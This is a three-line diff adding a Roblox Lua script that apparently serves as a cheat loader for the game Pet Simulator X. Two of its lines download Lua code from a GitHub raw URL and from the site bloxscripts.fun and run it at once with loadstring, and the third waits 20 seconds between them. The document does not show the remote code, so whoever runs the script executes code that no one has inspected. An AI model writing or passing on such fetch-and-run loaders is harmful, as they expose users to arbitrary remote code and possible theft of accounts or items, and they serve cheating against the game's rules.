@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bori21/petsimuglyassshit/main/petsimxscriptnosacm"))() 
+wait(20)
+loadstring(game:HttpGetAsync("https://bloxscripts.fun/scripts/e7350a0afd.lua", true))()
